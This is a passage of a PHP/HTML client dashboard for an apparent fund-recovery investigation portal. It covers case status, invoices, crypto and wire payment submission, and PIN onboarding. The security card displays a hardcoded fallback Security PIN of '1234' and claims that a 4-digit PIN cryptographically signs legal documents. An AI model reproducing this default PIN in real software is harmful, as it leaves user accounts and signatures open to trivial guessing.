                                     <td><span class="text-muted small"><?= date('M j, Y', strtotime($pr['created_at'])) ?></span></td>
                                     <td><strong><?= htmlspecialchars($pr['invoice_number'] ?? '#INV-' . $pr['invoice_id']) ?></strong></td>
                                     <td><strong class="text-success"><?= htmlspecialchars($pr['currency'] ?? 'USD') ?> <?= number_format($pr['amount'], 2) ?></strong></td>
                                     <td><span class="badge badge-info"><?= htmlspecialchars($pr['payment_method']) ?></span><br><small class="text-muted">Ref: <?= htmlspecialchars($pr['reference_number']) ?></small></td>
                                     <td>
                                         <?php if ($pr['status'] === 'Pending'): ?>
                                             <span class="badge badge-warning text-dark"><i class="fas fa-clock mr-1"></i> Pending Verification</span>
                                         <?php elseif ($pr['status'] === 'Confirmed'): ?>
                                             <span class="badge badge-success"><i class="fas fa-check-circle mr-1"></i> Approved</span>
                                         <?php else: ?>
                                             <span class="badge badge-danger" title="<?= htmlspecialchars($pr['notes'] ?? '') ?>"><i class="fas fa-times-circle mr-1"></i> Rejected</span>
                                         <?php endif; ?>
                                     </td>
                                 </tr>
                             <?php endforeach; ?>
                         </tbody>
                     </table>
                 </div>
             <?php endif; ?>
         </div>
     </div>

    <!-- RIGHT SIDEBAR -->
    <div class="col-lg-4">

        <!-- CASE SUMMARY CARD -->
        <?php if ($latest_case): ?>
        <div class="card shadow-sm border-0 mb-4">
            <div class="card-header bg-dark text-warning border-0 font-weight-bold py-3">
                <i class="fas fa-briefcase mr-2"></i>Current Case Status
            </div>
            <div class="card-body bg-dark text-white">
                <div class="mb-3">
                    <div class="text-muted small text-uppercase mb-1" style="font-size:10px;">Case Reference</div>
                    <div class="font-weight-bold text-warning" style="font-size:1.1rem;"><?= htmlspecialchars($latest_case['case_number'] ?? 'IFW-'.str_pad($latest_case['id'],5,'0',STR_PAD_LEFT)) ?></div>
                </div>
                <div class="mb-3">
                    <div class="text-muted small text-uppercase mb-1" style="font-size:10px;">Case Title</div>
                    <div class="font-weight-bold"><?= htmlspecialchars($latest_case['title']) ?></div>
                </div>
                <div class="mb-3">
                    <div class="text-muted small text-uppercase mb-1" style="font-size:10px;">Status</div>
                    <?php
                    $s = strtolower($latest_case['status'] ?? 'pending');
                    $badge = ['pending'=>'warning text-dark','in progress'=>'info','active'=>'info','resolved'=>'success','closed'=>'secondary'][$s] ?? 'secondary';
                    ?>
                    <span class="badge badge-<?= $badge ?> px-3 py-1" style="font-size:13px;"><?= htmlspecialchars(ucwords($latest_case['status'] ?? 'Pending')) ?></span>
                </div>
                <?php if (!empty($latest_case['agent_name'])): ?>
                <div class="mb-3">
                    <div class="text-muted small text-uppercase mb-1" style="font-size:10px;">Assigned Investigator</div>
                    <div class="font-weight-bold">
                        <i class="fas fa-user-shield mr-1 text-warning"></i><?= htmlspecialchars($latest_case['agent_name']) ?>
                        <span class="badge badge-warning text-dark ml-1" style="font-size:9px;"><?= htmlspecialchars(ucwords(str_replace('_', ' ', $latest_case['agent_role'] ?? 'Senior Investigator'))) ?></span>
                    </div>
                </div>
                <?php endif; ?>
                <?php if (!empty($latest_case['amount_lost']) && $latest_case['amount_lost'] > 0): ?>
                <div class="mb-3">
                    <div class="text-muted small text-uppercase mb-1" style="font-size:10px;">Reported Loss</div>
                    <div class="font-weight-bold text-danger">$<?= number_format($latest_case['amount_lost'],2) ?> <?= htmlspecialchars($latest_case['currency'] ?? 'USD') ?></div>
                </div>
                <?php endif; ?>
                <?php if (!empty($latest_case['amount_recovered']) && $latest_case['amount_recovered'] > 0): ?>
                <div class="mb-3">
                    <div class="text-muted small text-uppercase mb-1" style="font-size:10px;">Amount Recovered</div>
                    <div class="font-weight-bold text-success">$<?= number_format($latest_case['amount_recovered'],2) ?></div>
                </div>
                <?php endif; ?>
                <a href="/client/my_cases.php?case_id=<?= $latest_case['id'] ?>" class="btn btn-warning btn-sm font-weight-bold text-dark w-100 mt-2 shadow-sm">
                    <i class="fas fa-search mr-1"></i> View Full Case Details
                </a>
            </div>
        </div>
        <?php endif; ?>

        <!-- ASSIGNED INVESTIGATOR -->
        <div class="card shadow-sm border-0 mb-4 bg-dark text-white border-warning">
            <div class="card-header bg-dark border-bottom font-weight-bold py-3 text-warning">
                <i class="fas fa-user-shield mr-2"></i>Your Assigned Investigator
            </div>
            <div class="card-body text-center py-4">
                <div style="width:70px;height:70px;border-radius:50%;background:linear-gradient(135deg,#fecc56,#f0a500);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;box-shadow:0 4px 15px rgba(254,204,86,0.3);">
                    <i class="fas fa-user-tie fa-2x text-dark"></i>
                </div>
                <?php if ($agent_name_display): ?>
                    <h5 class="font-weight-bold mb-1 text-white"><?= htmlspecialchars($agent_name_display) ?></h5>
                    <span class="badge badge-warning text-dark font-weight-bold px-3 py-1 mb-2"><?= htmlspecialchars($agent_role_display) ?></span>
                    <p class="text-muted small mb-3"><i class="fas fa-envelope mr-1"></i><?= htmlspecialchars($client['agent_email'] ?? 'investigations@ifwglobal.com') ?></p>
                    <a href="chat.php" class="btn btn-warning btn-sm btn-block font-weight-bold text-dark shadow-sm">
                        <i class="fas fa-comments mr-1"></i> Direct Message Investigator
                    </a>
                <?php else: ?>
                    <h6 class="font-weight-bold mb-1 text-white">Pending Assignment</h6>
                    <p class="text-muted small mb-2">A certified forensic investigator will be assigned to your case shortly.</p>
                    <span class="badge badge-warning text-dark">Pending Assignment</span>
                <?php endif; ?>
            </div>
        </div>

        <!-- PORTAL SECURITY PIN -->
        <div class="card shadow-sm border-0 mb-4 bg-dark text-white border-warning">
            <div class="card-header bg-dark border-bottom font-weight-bold py-3 text-warning">
                <i class="fas fa-lock mr-2"></i>Portal Security PIN
            </div>
            <div class="card-body">
                <p class="text-light small mb-3">Your 4-digit Security PIN is used to cryptographically sign case files and documents (agreements, NDAs, power of attorney).</p>
                
                <?php if (!empty($client['pin_hash'])): ?>
                    <div class="alert alert-success border-0 small py-2 mb-3">
                        <i class="fas fa-check-circle mr-1"></i> Security PIN is active & configured.
                    </div>
                <?php else: ?>
                    <div class="alert alert-danger border-0 small py-2 mb-3">
                        <i class="fas fa-exclamation-triangle mr-1"></i> No PIN configured yet. Fallback PIN is <strong class="text-white">1234</strong>.
                    </div>
                <?php endif; ?>
                
                <form action="set_pin.php" method="POST" class="mt-2">
                    <div class="form-group mb-2">
                        <label class="small text-muted font-weight-bold">Configure New PIN</label>
                        <input type="password" name="new_pin" class="form-control form-control-sm bg-dark text-light border-secondary text-center font-weight-bold font-large" maxlength="4" placeholder="Enter 4-digit PIN" required pattern="\d{4}">
                    </div>
                    <button type="submit" class="btn btn-warning btn-sm btn-block font-weight-bold text-dark mt-2 shadow-sm">
                        <i class="fas fa-key mr-1"></i> Save Security PIN
                    </button>
                </form>
            </div>
        </div>

        <!-- PAYMENT INFORMATION -->
        <div class="card shadow-sm border-0 mb-4 bg-dark text-white">
            <div class="card-header bg-dark border-bottom font-weight-bold py-3 text-warning">
                <i class="fas fa-university text-warning mr-2"></i>Payment Information
            </div>
            <div class="card-body">
                <?php if (!empty($bank_details) || !empty($global_payment_info)): ?>
                    <?php if (!empty($global_payment_info)): ?>
                        <div class="alert alert-dark border border-secondary mb-3 small text-light">
                            <strong class="d-block mb-1 text-warning"><i class="fas fa-info-circle mr-1"></i> Instructions</strong>
                            <?= nl2br(htmlspecialchars($global_payment_info)) ?>
                        </div>
                    <?php endif; ?>
                    <?php if (!empty($bank_details)): ?>
                        <div class="bg-black p-3 rounded border border-secondary small text-light" style="white-space:pre-wrap; font-family: monospace; font-size:12px;">
                            <?= htmlspecialchars($bank_details) ?>
                        </div>
                    <?php endif; ?>
                <?php else: ?>
                    <p class="text-muted small text-center mb-0">Payment information will be provided on your invoice.</p>
                <?php endif; ?>
            </div>
        </div>
    </div>
</div>

<!-- PAY NOW MODAL -->
<div class="modal fade" id="payNowModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content border-0 shadow-lg bg-dark text-white">
            <div class="modal-header bg-dark text-warning border-secondary py-3">
                <h5 class="modal-title font-weight-bold"><i class="fas fa-credit-card mr-2"></i>Make Payment — <span id="payInvoiceRef"></span></h5>
                <button type="button" class="close text-white" data-dismiss="modal">&times;</button>
            </div>
            <div class="modal-body p-0">
                <div class="bg-black text-white p-4 border-bottom border-secondary">
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <div class="text-muted small text-uppercase" style="font-size:10px;">Balance Due</div>
                            <div class="font-weight-bold text-warning" style="font-size:2rem;" id="payAmount"></div>
                        </div>
                        <div class="text-right">
                            <span class="badge badge-danger px-3 py-2" style="font-size:13px;">Payment Required</span>
                        </div>
                    </div>
                </div>
                <div class="p-4 bg-dark">
                    <h6 class="font-weight-bold mb-3 text-warning"><i class="fas fa-university mr-2"></i>Payment Instructions & Accounts</h6>
                    <div class="bg-black border border-secondary rounded p-4 mb-4 text-light" id="paymentInfoBlock" style="white-space:pre-wrap; font-family: monospace; font-size:13px; line-height:1.8;"></div>
                    
                    <div class="alert alert-warning border-0 mb-4 text-dark">
                        <i class="fas fa-exclamation-triangle mr-2"></i>
                        <strong>Important:</strong> After sending your payment, please submit your transaction reference and upload the receipt/proof below for admin verification.
                    </div>

                    <form method="POST" action="/api/submit_payment_proof.php" enctype="multipart/form-data">
                        <input type="hidden" name="invoice_id" id="payInvoiceId">
                        <div class="row">
                            <div class="col-md-4 mb-3">
                                <label class="font-weight-bold text-light small">Amount Paid (<span id="payCurrencyLabel">USD</span>)</label>
                                <input type="number" step="0.01" name="amount_paid" id="payAmountInput" class="form-control bg-black text-white border-secondary" required placeholder="Enter amount paid">
                            </div>
                            <div class="col-md-4 mb-3">
                                <label class="font-weight-bold text-light small">Payment Method</label>
                                <select name="payment_method" class="form-control bg-black text-white border-secondary" onchange="if(this.value==='Other'){$('#otherPaymentMethodDivDashboard').show().find('input').attr('required',true);}else{$('#otherPaymentMethodDivDashboard').hide().find('input').removeAttr('required').val('');}" required>
                                    <option value="">Select method...</option>
                                    <option>Bank Wire Transfer</option>
                                    <option>Cryptocurrency (Bitcoin)</option>
                                    <option>Cryptocurrency (USDT)</option>
                                    <option>Credit / Debit Card</option>
                                    <option>Other</option>
                                </select>
                            </div>
                            <div class="col-md-4 mb-3">
                                <label class="font-weight-bold text-light small">Reference / TXID (Optional)</label>
                                <input type="text" name="reference_number" class="form-control bg-black text-white border-secondary" placeholder="e.g. TXN12345678">
                            </div>
                            <div class="col-md-12 mb-3" id="otherPaymentMethodDivDashboard" style="display:none;">
                                <label class="font-weight-bold text-warning small">Specify Other Payment Method <span class="text-danger">*</span></label>
                                <input type="text" name="other_payment_method" class="form-control bg-black text-white border-secondary" placeholder="e.g. PayPal, Revolut, CashApp">
                            </div>
                        </div>
                        <div class="mb-3">
                            <label class="font-weight-bold text-light small">Upload Payment Receipt / Proof</label>
                            <input type="file" name="proof_file" class="form-control-file border border-secondary p-2 rounded w-100 bg-black text-white" accept=".jpg,.jpeg,.png,.pdf,.doc,.docx" required>
                            <small class="text-muted">Accepted: JPG, PNG, PDF, DOC (Max 10MB)</small>
                        </div>
                        <div class="mb-3">
                            <label class="font-weight-bold text-light small">Additional Notes (Optional)</label>
                            <textarea name="notes" class="form-control bg-black text-white border-secondary" rows="2" placeholder="Any additional notes about your payment transaction..."></textarea>
                        </div>
                        <button type="submit" class="btn pay-btn btn-block font-weight-bold py-3 shadow-lg">
                            <i class="fas fa-paper-plane mr-2"></i> Submit Payment Proof for Verification
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- FIRST TIME ONBOARDING MODAL -->
<div class="modal fade" id="onboardingModal" tabindex="-1" role="dialog" aria-labelledby="onboardingModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content bg-dark text-white border-warning">
      <div class="modal-header border-secondary">
        <h5 class="modal-title text-warning font-weight-bold" id="onboardingModalLabel"><i class="fas fa-shield-alt mr-2"></i>First-Time Security Configuration</h5>
      </div>
      <form method="POST">
        <input type="hidden" name="action" value="setup_security">
        <div class="modal-body">
            <p class="small text-muted mb-3">For your security, you must change your temporary password and configure a 4-digit Security PIN before accessing the dashboard.</p>
            
            <div class="form-group mb-3">
                <label class="text-white font-weight-bold small">New Password</label>
                <input type="password" name="onboarding_new_password" class="form-control bg-secondary text-white border-0" required minlength="6" placeholder="Enter new password">
            </div>
            
            <div class="form-group mb-3">
                <label class="text-white font-weight-bold small">Confirm Password</label>
                <input type="password" class="form-control bg-secondary text-white border-0" required placeholder="Confirm new password" oninput="if(this.value !== document.getElementsByName('onboarding_new_password')[0].value){ this.setCustomValidity('Passwords do not match'); } else { this.setCustomValidity(''); }">
            </div>
            
            <div class="form-group mb-3">
                <label class="text-white font-weight-bold small">Set 4-Digit Security PIN</label>
                <input type="password" name="onboarding_new_pin" class="form-control bg-secondary text-white border-0 text-center font-weight-bold font-large" maxlength="4" placeholder="e.g. 9876" required pattern="\d{4}">
                <small class="text-muted d-block mt-1">This PIN is required to cryptographically sign private/personal and case related legal documents.</small>
            </div>
        </div>
        <div class="modal-footer border-secondary">
            <button type="submit" class="btn btn-warning font-weight-bold text-dark w-100 py-2"><i class="fas fa-lock-open mr-2"></i>Configure Security & Enter Dashboard</button>
        </div>
      </form>
    </div>
  </div>
</div>

<script>
function showPayModal(invoiceId, ref, balanceDue, currency, paymentInfo) {
    currency = currency || 'USD';
    document.getElementById('payInvoiceId').value = invoiceId;
    document.getElementById('payInvoiceRef').textContent = ref;
    document.getElementById('payCurrencyLabel').textContent = currency;
    document.getElementById('payAmount').textContent = currency + ' ' + parseFloat(balanceDue).toLocaleString('en-US', {minimumFractionDigits: 2});
    document.getElementById('payAmountInput').value = parseFloat(balanceDue).toFixed(2);
    document.getElementById('paymentInfoBlock').textContent = paymentInfo || 'Please contact your assigned investigator for payment details.';
    $('#payNowModal').modal('show');
}

$(document).ready(function() {
    <?php if (empty($client['pin_hash'])): ?>
        $('#onboardingModal').modal({
            backdrop: 'static',
            keyboard: false
        });
        $('#onboardingModal').modal('show');
    <?php endif; ?>
});
</script>

<?php require_once $dir . '/includes/admin_footer.php'; ?>